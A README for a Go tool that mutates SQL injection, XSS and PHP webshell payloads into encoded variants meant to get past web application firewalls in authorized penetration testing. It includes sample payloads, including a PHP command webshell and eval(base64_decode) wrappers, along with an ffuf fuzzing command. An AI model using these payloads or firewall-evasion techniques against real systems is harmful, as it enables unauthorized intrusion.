# JLFPayloadObfuscator

Advanced WAF Evasion Wordlist Generator for Web Application Penetration Testing.

Developed by: **jakeloai+AI**

---

## Overview

JLFPayloadObfuscator is a high-performance payload mutation and encoding engine written in pure Go (standard library only). It accepts standard test payloads, webshells, or exploit strings and produces multiple obfuscated and encoded variants for use with web fuzzing tools like ffuf, Burp Intruder, or custom testing frameworks.

The tool is designed for QA engineers, application security testers, and bug bounty hunters who need to bypass advanced WAF (Web Application Firewall) rules during precise parameter testing.

---

## Features

### Input Handling
- Single payload string via `-p` flag
- Multi-line payload file via `-f` flag
- Automatic whitespace trimming and empty line discarding

### Encoding & Mutation Modules

#### General Encodings (`-m general`)
- Standard URL encoding
- Double URL encoding
- Pure hexadecimal encoding
- Hex with `\x` prefix
- Hex with `0x` prefix
- HTML entity encoding (decimal)
- HTML entity encoding (hexadecimal)
- Unicode escape sequences (`\u00xx` format)
- Base64 encoding
- Chained variants (Base64 + URL encode, URL encode + Base64)

#### SQL Injection Mutations (`-m sql`)
- Inline comment space replacement (`/**/` or `+`)
- Keyword case randomization (`SeLeCt`, `UnIoN`, `FrOm`, etc.)
- Combined mutation with general encodings

#### XSS Mutations (`-m xss`)
- Tag case randomization (`<ScRiPt>`, `<ImG>`, etc.)
- Event handler case randomization (`oNeRrOr`, `oNcLiCk`, etc.)
- `javascript:` protocol case randomization
- Combined mutation with general encodings

#### PHP / Dynamic Script Mutations (`-m php`)
- XOR-based dynamic string generation (fixed byte key `0x5A`)
- Bitwise NOT inversion (`~` prefix)
- Base64 eval wrappers (`eval(base64_decode(...))`)
- Assert wrappers (`@assert(base64_decode(...))`)
- preg_replace eval wrappers

#### All Modes Combined (`-m all`)
- Activates all encoding and mutation strategies simultaneously

### Output & Safety
- Strict deduplication using Go map (`seen[string]bool`)
- Streaming output to text file (line by line)
- MD5 audit hash for output file integrity verification
- Clean status report with generation statistics

---

## Installation

### Prerequisites
- Go 1.18 or higher

### Build from Source

```bash
git clone https://github.com/jakeloai/JLFPayloadObfuscator
cd JLFPayloadObfuscator
go build -o jlfpayload main.go
```

### Cross-Compilation Examples

```bash
# Linux AMD64
GOOS=linux GOARCH=amd64 go build -o payloadobfuscator-linux main.go

# Windows AMD64
GOOS=windows GOARCH=amd64 go build -o payloadobfuscator.exe main.go

# macOS ARM64 (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -o payloadobfuscator-mac main.go

# macOS AMD64 (Intel)
GOOS=darwin GOARCH=amd64 go build -o payloadobfuscator-mac-intel main.go
```

---

## Usage

### Basic Examples

#### Single Payload - SQL Injection
```bash
./jlfpayload -p "' OR 1=1--" -m sql -o sql_wordlist.txt
```

#### Single Payload - XSS
```bash
./jlfpayload -p "<script>alert(1)</script>" -m xss -o xss_wordlist.txt
```

#### Single Payload - PHP Webshell
```bash
./jlfpayload -p "<?php system($_GET['cmd']); ?>" -m php -o php_wordlist.txt
```

#### File Input - Multiple Payloads
```bash
./jlfpayload -f payloads.txt -m all -o obfuscated_wordlist.txt
```

#### General Encoding Only
```bash
./jlfpayload -p "admin' OR '1'='1" -m general -o general.txt
```

### Command Line Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-p` | Single payload string to obfuscate | (none) |
| `-f` | File path containing multi-line payloads | (none) |
| `-o` | Output file path | `obfuscated_wordlist.txt` |
| `-m` | Mode filter: `sql`, `xss`, `php`, `general`, `all` | `all` |

### Using with ffuf

```bash
# Generate wordlist
./jlfpayload -f my_payloads.txt -m all -o fuzz_wordlist.txt

# Fuzz with ffuf
ffuf -w fuzz_wordlist.txt -u "https://target.com/api?param=FUZZ" -mc 200,301,302,403
```

---

## Input File Format

The input file (`-f`) should contain one payload per line:

```
' OR 1=1--
<script>alert(document.cookie)</script>
<?php eval($_POST['cmd']); ?>
admin' --
1' AND 1=1 UNION SELECT null, version() --
```

Empty lines and leading/trailing whitespace are automatically stripped.

---

## Output Format

The output file contains one obfuscated variant per line:

```
' OR 1=1--
%27%20OR%201%3D1--
' OR 1=1--
&#39;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#45;&#45;
JyBPUiAxPTEtLQ==
'/**/OR/**/1=1--
'/**/oR/**/1=1--
...
```

---

## Architecture

```
Input Layer (flag parsing)
    |
    v
Payload Splitting & Cleaning
    |
    v
Obfuscation Engine
    |-- General Encoders
    |-- SQL Mutators
    |-- XSS Mutators
    |-- PHP Mutators
    |
    v
Deduplication (map[string]bool)
    |
    v
Streaming Output to .txt
    |
    v
Status Report + MD5 Audit Hash
```

---

## Technical Details

### Pure Standard Library
JLFPayloadObfuscator uses only Go standard library packages:
- `encoding/base64` - Base64 encoding
- `encoding/hex` - Hexadecimal encoding
- `net/url` - URL encoding
- `crypto/md5` - MD5 hash for audit
- `math/rand` - Random case generation
- `strings`, `bufio`, `os`, `flag`, `fmt`, `time`

No external dependencies. Zero CGO. Compiles cleanly on any platform supported by Go.

### Deduplication Strategy
All variants are stored in a `map[string]bool` before writing to disk. This ensures:
- 100% unique output
- No wordlist bloat
- Deterministic output size relative to input complexity

### Random Case Generation
Case randomization uses `math/rand` seeded with current time. Each execution may produce slightly different case patterns for the same input, increasing WAF bypass probability across multiple runs.

---

## Use Cases

| Scenario | Recommended Mode |
|----------|-----------------|
| SQL Injection testing | `-m sql` |
| XSS / DOM-based testing | `-m xss` |
| PHP file upload / eval testing | `-m php` |
| Generic parameter fuzzing | `-m general` |
| Comprehensive WAF bypass | `-m all` |
| Unknown target / blind testing | `-m all` |

---

## Limitations & Scope

This tool operates at the **string-level obfuscation** layer. It does NOT:
- Parse or understand SQL/HTML/PHP syntax trees
- Perform active scanning or vulnerability detection
- Handle binary protocols (Protobuf, gRPC)
- Generate novel exploits (only mutates provided payloads)
- Bypass behavioral WAF rules (rate limiting, IP reputation)

It is designed to be a **preprocessor** in your testing pipeline:
1. You discover or craft a payload
2. PayloadObfuscator generates variants
3. You feed variants to ffuf/Burp for precise testing

---

## Security & Legal Notice

This tool is intended for **authorized security testing only**.

- Use only on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- The developers assume no liability for misuse of this software
- Always follow responsible disclosure practices

---

## Version History

### v1.0.0
- Initial release
- General encoding module (URL, Hex, HTML, Unicode, Base64)
- SQL injection mutation module
- XSS mutation module
- PHP dynamic script mutation module
- File I/O and MD5 audit hashing
- Cross-platform compilation support

---

## Developer

**jakeloai+AI**

Built for the web application security testing community.

---

## License

MIT License - See LICENSE file for details.
